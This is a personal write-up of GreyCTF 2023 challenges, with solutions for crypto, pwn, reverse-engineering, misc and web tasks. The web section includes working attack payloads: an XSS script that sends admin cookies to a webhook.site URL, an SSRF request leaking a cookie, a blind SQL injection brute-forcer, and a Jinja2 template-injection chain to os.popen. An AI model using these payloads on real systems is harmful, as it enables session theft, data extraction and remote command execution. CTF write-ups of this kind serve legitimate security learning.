# GreyCTF 2023

---

# Crypto

## Baby Crypto

> I found this weird string, do you know what it means?
> whuo{squi4h_s1fx3h_v0h_co_i4b4T}

Cesaer Cipher
- https://planetcalc.com/1434/

ROT10
- grey{caes4r_c1ph3r_f0r_my_s4l4D}

## EncryptService

From the code, the user can encrypt a known plaintext with a single-byte hashed for the IV. This is repeated 256 times for all possible single-bytes. The flag is encrypted with one of the 256 IVs at random. Importantly, the secret key is reused for all.

https://crypto.stackexchange.com/a/2993/why-must-iv-key-pairs-not-be-reused-in-ctr-mode

Assuming Key and IV are reused:
- C1 = P1 XOR F(Key,IV)
- C2 = P2 XOR F(Key,IV)
- Hence, C1 XOR C2 = P1 XOR P2

Choose our known plaintext as all zero bytes (ie. P1 = 0). Such that, C_{zeros} XOR C_{flag} = 0 XOR P_{flag} = P_{flag}.

To solve:
- Encrypt an all-zero known plaintext.
- Get all the 256 ciphertexts.
- Get the cipherflag.
- XOR each of the 256 ciphertexts with the cipherflag
- One of the results will be the plaintext

```bash
$ python3 EncryptService_solution.py
    218 ** b'grey{0h_m4n_57r34m_c1ph3r_n07_50_53cur3}'
```

## The Vault

> Can you break into a double-encrypted vault?

AES CTR is used. Let F be flag, s be AES function, K1 be first key, K2 be second key, IV be initialisation vector.

From code:

    first_key = sha256(long_to_bytes(x)).digest()
    second_key = sha256(long_to_bytes(pow(x, 10, n))).digest()
    ...
    if thief_check == encryption(first_key, encryption(second_key, thief_check)):

Hence:
- F = [F xor s(K2, IV)] xor s(K1, IV)
- To solve, we need `K2 == K1` or `x == pow(x, 10, n)`
- where `n = pow(10, 128)` and `x = pow(a, b, n)`
- Conditions are that `a` is not a multiple of 10 and `pow(a, b) > n`.

We see that:

    pow(a, b, n) == pow(a, b*10, n)
    
So to solve it, it must be that there is a repeating pattern:
- See https://math.stackexchange.com/a/301258
- It is guaranteed that is repeating pattern within n terms.

Hence, choose b = n = `10**128`:

    $ nc 34.124.157.94 10591
    Welcome back, NUS Dean. Please type in the authentication codes to open the vault! 

    Enter the first code: 2
    Enter the second code: 100000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
    Performing thief checks...

    Vault is opened.
    grey{th3_4n5w3R_T0_Th3_3x4M_4nD_3v3ry7H1N6_1s_42}

## GreyCat Trial

First trial is Fermet Little Theorem prime test. Also, note that that psuedoprimes (such as Carmichael numbers will pass this test).

Second trial includes random additions between 0-26. 

This code is to find primes and psuedoprimes for the given base of 23456789. Using this code, we can observe that the first prime is `3` and there are many primes close by in sequence.

```python
# Find all primes and psuedoprimes
all_seeing_number = 23456789
for c in range(1, 1000000, 2):
    if pow(all_seeing_number, c - 1, c) == 1:
        print(c)
```

Hence, as the random additions may result in non-(psuedo)primes as well. We can control `b` to maximise the probability of passing the trial.

This code is to do some trial-and-error to determine which pairs of `a` and `b` gives us the highest probability of producing a psuedo-prime for the random trial numbers.

```python
from random import randint

def get_probability(a, b):
    all_seeing_number = 23456789
    trial_numbers = [i for i in range(26)]
    successes = 0
    for number in trial_numbers:
        c = a + b * number
        if pow(all_seeing_number, c - 1, c) == 1:
            successes += 1
    
    return successes / len(trial_numbers)

for i in range(1,50):
    p = get_probability(i, 2)
    print(i, p)
```

These are the probabilities

    [b = 1]
    3 0.5
    4 0.5
    5 0.46153846153846156
    6 0.46153846153846156
    7 0.46153846153846156
    8 0.4230769230769231
    9 0.4230769230769231
    10 0.4230769230769231

    [b = 2]
    3 0.8461538461538461
    4 0.038461538461538464
    5 0.8076923076923077
    6 0.0
    7 0.7692307692307693
    8 0.0
    9 0.7692307692307693
    10 0.0
    11 0.7692307692307693

    [b = 3]
    3 0.2692307692307692
    4 0.46153846153846156
    5 0.46153846153846156
    6 0.2692307692307692
    7 0.4230769230769231
    8 0.46153846153846156
    9 0.2692307692307692
    10 0.38461538461538464

Hence, I chose a = 3 and b = 2 which gives a 84% probability that the second trial will pass even after the random additions.

```python
import socket
import telnetlib

while True:
    s = socket.socket()
    s.connect(('34.124.157.94', 10592))
    t = telnetlib.Telnet()
    t.sock = s

    t.write(b'3\n')
    t.write(b'2\n')
    result = t.read_all()
    if b'Thou art not yet strong enough' in result:
        print("Second trial failed")
    elif b'Thou art nigh, but thy power falters still' in result:
        print("Third trial failed")
    else:
        print("Flag", result)
        break
```

Running it for 1 minute, we get the flag.

    Second trial failed
    ...
    Second trial failed
    Second trial failed
    Second trial failed
    Flag Lo and behold! The GreyCat Wizard, residing within the Green Tower of PrimeLand, is a wizard of unparalleled prowess
    The GreyCat wizard hath forged an oracle of equal potency
    The oracle hath the power to bestow upon thee any knowledge that exists in the world
    Gather the requisite elements to triumph over the three trials, noble wizard.
    The first element: The second element: 
    Truly, thou art the paramount wizard. As a reward, we present thee with this boon:
    grey{Gr33N-tA0_The0ReM_w1z4rd}

## Encrypt (incomplete)

To recover the original message m, the attacker can rearrange the formula and solve for m:

    c1 = p * m1 + q * m1**2 + (m1 + p + q) * key
    c2 = p * m2 + q * m2**2 + (m2 + p + q) * key

    c1-c2 = (m1-m2)*(p+key) + q*(m1**2 - m2**2)
    c1-c2 = (m1-m2)*(p+key+q*(m1+m2))

    c1+c2 = (m1+m2)*p + q*(m1**2 + m2**2) + (m1+m2+2p+2q)*key

---

# Pwn

## BabyPwn

The code mixes signed and unsigned integers. Simple integer underflow bug by entering a negative withdrawal number.

    Enter the amount to withdraw: -1000
    Withdrawal successful. New account balance: $1100

    Congratulations! You have reached the required account balance ($1100).
    The flag is: grey{b4by_pwn_df831aa280e25ed6c3d70653b8f165b7}

## EasyPwn (incomplete)

Address of win()

    win:
    000106a6  inc  ecx

---

# Rev

## Web Assembly

Save WebAssembly binary buffer to a file

    arr = [0, 97, 115, 109, 1, 0, 0, 0, 1, 5, 1, 96, 0, 1, 127, 2, 11, 1, 2, 106, 115, 3, 109, 101, 109, 2, 0, 1, 3, 2, 1, 0, 7, 9, 1, 5, 99, 104, 101, 99, 107, 0, 0, 10, 122, 1, 120, 1, 3, 127, 65, 0, 33, 0, 65, 1, 33, 2, 3, 64, 2, 64, 2, 64, 2, 64, 2, 64, 2, 64, 32, 0, 65, 4, 112, 14, 3, 3, 2, 1, 0, 11, 65, 137, 2, 33, 1, 12, 3, 11, 65, 59, 33, 1, 12, 2, 11, 65, 41, 33, 1, 12, 1, 11, 65, 31, 33, 1, 12, 0, 11, 32, 1, 65, 255, 1, 32, 0, 40, 2, 0, 113, 108, 65, 255, 1, 113, 32, 0, 65, 192, 0, 106, 40, 2, 0, 65, 255, 1, 113, 115, 65, 0, 70, 32, 2, 108, 33, 2, 32, 0, 65, 1, 106, 33, 0, 32, 0, 65, 46, 72, 13, 0, 11, 32, 2, 11]
    with open("wasmBinBuf.wasm", "wb") as f:
        f.write(bytes(arr))
        
Decompile using wabt (https://github.com/WebAssembly/wabt/releases/tag/1.0.33):

    ./wasm-decompile wasmBinBuf.wasm -o decompiled.txt

We get the following decompilation

```c
import memory js_mem;

export function check():int {
var b:int;
var a:int_ptr = 0;
var c:int = 1;
loop L_a {
    br_table[B_c, B_d, B_e, ..B_f](a % 4)
    label B_f:
    b = 265;
    goto B_b;
 label B_e:
    b = 59;
    goto B_b;
 label B_d:
    b = 41;
    goto B_b;
 label B_c:
    b = 31;
    goto B_b;
 label B_b:
    c = (((b * (255 & a[0]) & 255) ^ ((a + 64)[0]:int & 255)) == 0) * c;
    a = a + 1;
    if (a < 46) continue L_a;
}
return c;
}
```

Convert to a python script. For each character, bruteforce all chars until the condition passes.

```python
def check():
    a = 0
    b = 0
    c = 1
    data = [0]*64 + [121, 66, 71, 65, 229, 176, 150, 150, 43, 107, 209, 212, 12, 217, 16, 222, 129, 189, 55, 185, 82, 127, 229, 47, 45, 178, 252, 11, 107, 43, 31, 114, 20, 97, 229, 185, 237, 55, 252, 87, 12, 168, 75, 222, 121, 5]

    while True:
        if a%4 == 0: b = 31
        if a%4 == 1: b = 41
        if a%4 == 2: b = 59
        if a%4 == 3: b = 265

        # c = (((b * (255 & data[a]) & 255) ^ (data[a + 64] & 255)) == 0) * c;
        for flag in range(256):
            c1 = (((b * (255 & (flag)) & 255) ^ (data[a + 64] & 255)) == 0);
            if c1 > 0: print(chr(flag), end='')
        a += 1

        if not (a < 46):
            break

check()
```

> grey{0bfusc4t10n_u51ng_w3b4s53mbly_1s_4_th1ng}

## Crackme1 (incomplete)

After prettifying and deobfuscating (https://deobfuscate.relative.im/), the function of interest is this:

```js
function _0x2d148f() {
    const _0x264178 = document.getElementById('textInput')
    var _0x3be76d = _0x264178.value
    while (_0x3be76d.length < 1024) {
        _0x3be76d = _0x3be76d + _0x3be76d
    }
    _0x3be76d = _0x3be76d.substring(0, 1024) // cycle the key until 1024 length
    _0x1d1d26(_0x3be76d) // some gui function
    var _0x5c36a9 = [
        195, 184, 179, 66, 182, 194, 28, 164, 206, 69, 6, 59, 31, 28, 102, 177,
        108, 154, 54, 229, 20, 191, 24, 110,
        ],
        _0x35223f = _0x656fa5(_0x3be76d, 24), // unknown function = _0x3be76d: KEY, 24: CIPHERFLAG
        _0x258cbb = '' // Buffer with decrypted flag
    for (var _0x2e4a9c = 0; _0x2e4a9c < 24; ++_0x2e4a9c) {
        _0x258cbb += String.fromCharCode(
        _0x5c36a9[_0x2e4a9c] ^ _0x35223f[_0x2e4a9c]
        )
    }
    if (_0x258cbb.startsWith('grey{')) {
        document.querySelector('#flag').textContent = _0x258cbb
    }
}
```

Pasting into ChatGPT:

> The given function is an implementation of the RC4 encryption algorithm. It takes two parameters: `_0x51d5a4` and `_0x14e107`. Let's break down the function and understand its operations step by step:
> 
> 1. Initialization:
>   - It initializes an array `_0x1c6239` and sets it to an array of numbers from 0 to 255.
>   - It initializes variables `_0x51a6b8`, `_0xc583ec`, and `_0x11ff50` to 0 and an empty array, respectively.
>
> 2. Key Scheduling:
>   - It performs a key scheduling operation by iterating from 0 to 255.
>   - Inside the loop, it swaps values in the `_0x1c6239` array based on calculations involving the key `_0x51d5a4`.
>   - The key `_0x51d5a4` is a string, and the character codes of its characters are used in the calculations.
>
> 3. Pseudo-Random Generation:
>   - It generates a pseudo-random sequence of numbers using the key scheduling array `_0x1c6239`.
>   - It does this by iterating from 0 to `_0x14e107` (the desired length of the output sequence).
>   - Inside the loop, it performs a similar swapping operation as in the key scheduling step but with additional calculations.
>   - The swapped values are used to index the `_0x1c6239` array and retrieve a pseudo-random number.
>   - The retrieved number is then pushed into the `_0x11ff50` array.
>
> 4. Output:
>   - The function returns the `_0x11ff50` array containing the generated pseudo-random sequence.
>
> In summary, this function takes a key (`_0x51d5a4`) and a desired length (`_0x14e107`), and it uses the RC4 algorithm to generate a pseudo-random sequence of numbers based on the key. This algorithm was commonly used for encryption purposes in the past, but it is now considered relatively weak and has been replaced by stronger encryption algorithms.

The vulnerability

> Knowing that _0x656fa5 is an RC4 implementation, the vulnerability in this code likely lies in the way the key is generated, the key length, or how the encrypted flag is used. Without additional information or the complete context of the code, it is challenging to determine the specific vulnerability that could lead to retrieving the flag.

# Misc

## CrashPython

Solution according to Bing Chat:

    There are a few ways to deliberately cause a segmentation fault within Python, but they are not recommended as they can crash your program or corrupt your data. Some examples are:

    - Using `ctypes` to access invalid memory addresses³⁴. For example: `import ctypes; ctypes.string_at(0)`
    - Using `os.kill` to send a `SIGSEGV` signal to the current process³. For example: `import os, signal; os.kill(os.getpid(), signal.SIGSEGV)`
    - Using `faulthandler` to raise a `SIGSEGV` exception³. For example: `import faulthandler; faulthandler.raise_signal(signal.SIGSEGV)`
    - Using a C extension module that has a bug or memory leak¹². For example: `import numpy as np; np.zeros(-1)`

    Source: Conversation with Bing, 20/05/2023
    (1) segmentation fault - How to catch SegFault in Python as exception .... https://stackoverflow.com/questions/74591919/how-to-catch-segfault-in-python-as-exception.
    (2) Understanding Segmentation Fault in Python: Causes and Solutions. https://pythonbaba.com/segmentation-fault-python/.
    (3) What causes a Python segmentation fault? - Stack Overflow. https://stackoverflow.com/questions/10035541/what-causes-a-python-segmentation-fault.
    (4) How to find a real cause for Python segmentation fault. https://stackoverflow.com/questions/53925817/how-to-find-a-real-cause-for-python-segmentation-fault.

Submit this

    import ctypes; ctypes.string_at(0)

> Congrats, you got the flag: grey{pyth0n-cv3-2021-3177_0r_n0t?_cd924ee8df15912dd55c718685517d24}!


## beepboop (incomplete)

From frequency analysis in Tenacity:
- Low frequency = 500Hz
- High frequency = 1333Hz (1ms)
- Baud rate = 66Hz (15ms)

Attempt to decode
```bash
wget https://raw.githubusercontent.com/ZoeB/wave-tools/master/fsk-decode.py
python3 fsk-decode.py --baud-rate=50 --frequency-threshold=1000 --endianness=big beepboop.wav
```

---

# Web

## Fetus Web

    curl -s http://34.124.157.94:12325 | grep Flag
        <!-- Flag part 1: grey{St3p_1-->

    curl -s http://34.124.157.94:12325/assets/js/main.js | grep Flag
        //Flag part 2: _of_b4by_W3b}

> grey{St3p_1_of_b4by_W3b}


## Login Bot

Make a post with content `bot_login`. Admin will visit your page. Use https://webhook.site/ to retrieve the data

> grey{r3d1recTs_r3Dir3cts_4nd_4ll_0f_th3_r3d1r3ct5}


## Baby Web

Admin's cookies contain the flag. Admin will also visit your posted content. 

The content may contain HTML which will be parsed.

With this payload, the page will redirect to a webhook, with the cookies passed as a parameter.

```html
    <script>
    function listCookies() {
    var theCookies = document.cookie.split(';');
    var aString = '';
    for (var i = 1 ; i <= theCookies.length; i++) {
        aString += i + ' ' + theCookies[i-1] + "\n";
    }
    return aString;
    }
    window.location = "https://webhook.site/c0010b02-1d04-4bf8-ae2a-47f6e6ec5f97?cookie=" + listCookies();
    </script>
```

Flag: 

    Query strings
    cookie	1 flag=grey{b4by_x55_347cbd01cbc74d13054b20f55ea6a42c}


## 100 Questions

SQL injection is possible as seen in this part of the source code.

    cursor = db.execute(f"SELECT * FROM QNA WHERE ID = {qn_id} AND Answer = '{ans}'")

After scanning through all questions using a script, Q42 asks for the flag.

Here, we verify that an SQL injection works.

    ' or 1=1 --

This injection also works. Hence, we can bruteforce all chars of the answer flag.

    ' or Answer LIKE 'grey{%' --

Solution

```python
import requests
import string

def attempt(payload):
    while True:
        try:
            url = f"http://34.126.139.50:10512/?qn_id=42&ans={payload}"
            text = requests.get(url, timeout=1).text
            return ('Correct!' in text)
        except:
            pass

charset = (string.printable
                .replace(' ', '')
                .replace('\'', '')
                .replace('%', '')
                .replace('^', '')
                .replace('+', '')
                .replace('\t\n\r\x0b\x0c', '')
                .replace('"', ''))

flag = "grey{"
while '}' not in flag:
    for ch in charset:
        ch = ch.replace('_', '^_')
        payload = f"' or Answer LIKE '{flag+ch}%' ESCAPE '^' --"
        if attempt(payload):
            flag += ch
            print("Success", flag)
        else:
            print("\rFailed", ch, end='')

```

    Failed 0Success grey{1
    Failed ]Success grey{1^_
    Failed bSuccess grey{1^_c
    Failed 3Success grey{1^_c4
    Failed mSuccess grey{1^_c4n
    Failed 6_Success grey{1^_c4n7
    Failed ]Success grey{1^_c4n7^_
    Failed 4Success grey{1^_c4n7^_5
    Failed 2Success grey{1^_c4n7^_53
    Failed 2_Success grey{1^_c4n7^_533
    Failed |Success grey{1^_c4n7^_533}

Note that the LIKE operator is case insensitive. Hence I realised that the flag obtained here is all in lowercase only. The actual flag was found by submitting a few guesses for the the uppercase chars.

> grey{1_c4N7_533}

## Microservices

Analyzing the code. We see that we can access the flag if we log in with admin cookies to the home page. If we pass a second parameter, we can bypass the `requested_service` check on the admin page.

    # gateway/constant.py
        routes = {"admin_page": "http://admin_page", "home_page": "http://home_page"}

    # gateway/app.py
        microservice = request.args.get("service", "home_page")
        route = routes.get(microservice, None)

        ...
        # Fetch the required page with arguments appended
        raw_query_param = request.query_string.decode()
        print(f"Requesting {route} with q_str {raw_query_param}", file=sys.stderr)
        res = get(f"{route}/?{raw_query_param}")


    # admin_page/app.py
        # Currently Work in Progress
        requested_service = request.query_params.get("service", None)
        if requested_service is None:
            return {"message": "requested service is not found"}

        # Filter external parties who are not local
        if requested_service == "admin_page":
            return {"message": "admin page is currently not a requested service"}

        # Legit admin on localhost
        requested_url = request.query_params.get("url", None)
        if requested_url is None:
            return {"message": "URL is not found"}

        # Testing the URL with admin
        response = get(requested_url, cookies={"cookie": admin_cookie})
        return Response(response.content, response.status_code)

Setting the URL to a webhook, we can retrieve the admin cookie.

 - http://34.124.157.94:5014/?service=admin_page&service=none&url=https://webhook.site/c0010b02-1d04-4bf8-ae2a-47f6e6ec5f97

From the webhook, we can access the flag using the admin cookie.

    cookie=b02472dcc72fc41d291fb5621a1e0f1bc1ec26d5d3a84b6809a83725faa02b3a6d039070ad000b05f804fdc3c361e4492561f92931efebbe1fbdf41a6e99fabc6a8ed9e15a392c61847f69a13fb9e5832819d41576ee8c1e606c99189335e6eccd329f1f420f2644b58af9ce154f4bc9ebe3594be7f7ecc39b58252bfe94e46bdd9d71cc8c3ccbea13a0557244e5b3ef1a7f9211f1b13517eb0d1adb89ef1cec357bdf5ec8f23318ee3804f619b835ed82dd7cabb45b6ec6a8eb60d6dd6ccec0732d9dd44269e442fe529b320d24cc578adee213399899bb436dbb1c0278a446957ebbbdb10da0293a98dc52795cb49ae15816719dd3805cf430a31c3306026c9b76656b923c0cca082295090889eaee44efa4ae3a86eb79aecb5cdd7f74fc3af6758ff1ff77372d6429a86f

    $ curl --cookie cookie=$cookie http://34.124.157.94:5014/

Alternatively, access the flag directly

    http://34.124.157.94:5014/?service=admin_page&service=none&url=http://home_page

> Congratulations, you got the flag: grey{d0ubl3_ch3ck_y0ur_3ndp0ints_in_m1cr0s3rv1c3s}

## Microservices Revenge

Exploitable function `render_template_string()`:

    # adminpage
    @app.get("/")
    def index() -> Response:
        """
        The base service for admin site
        """
        user = request.cookies.get("user", "user")

        # Currently Work in Progress
        return render_template_string(
            f"Sorry {user}, the admin page is currently not open."
        )

Verify that Server-Side Template Injection is working 

    $ curl --cookie "user= {{7*7}}" "http://34.124.157.94:5005/?service=adminpage"
        Sorry 49, the admin page is currently not open.

Reference: 
- https://medium.com/@nyomanpradipta120/ssti-in-flask-jinja2-20b068fdaeee
- https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection/jinja2-ssti

Here is my process of forming the SSTI attack

```python
    # From the "object" class call __subclasses__()
    dict.mro()[-1] | attr(request.args.c) 

    # Access Popen class
    (dict.mro()[-1] | attr(request.args.c))()[343]

    # Access __init__
    (dict.mro()[-1] | attr(request.args.c))()[343] | attr(request.args.d)

    # Access __globals__
    (dict.mro()[-1] | attr(request.args.c))()[343] | attr(request.args.d) | attr(request.args.e)

    # sys class
    ((dict.mro()[-1] | attr(request.args.c))()[343] | attr(request.args.d) | attr(request.args.e))[\"sys\"]

    # Get shell on os.popen(xxx).read()
    ((dict.mro()[-1] | attr(request.args.c))()[343] | attr(request.args.d) | attr(request.args.e))[\"sys\"].modules[\"os\"].popen(request.args.shell).read()
```

Solution to get the flag

```python
# Jupyter script
def got_my_shell(cmd):
    import urllib.parse
    payload = urllib.parse.quote(cmd)
    !curl --globoff --cookie "user={{{{((dict.mro()[-1] | attr(request.args.c))()[343] | attr(request.args.d) | attr(request.args.e))[\"sys\"].modules[\"os\"].popen(request.args.shell).read()}}}}" "http://34.124.157.94:5005/?service=adminpage&c=__subclasses__&d=__init__&e=__globals__&shell=$payload"

got_my_shell("curl http://rflagpage/flag")
```

> Sorry {&#34;message&#34;:&#34;This is the flag: grey{55t1_bl4ck1ist_byp455_t0_S5rf_538ad457e9a85747631b250e834ac12d}&#34;} , the admin page is currently not open.
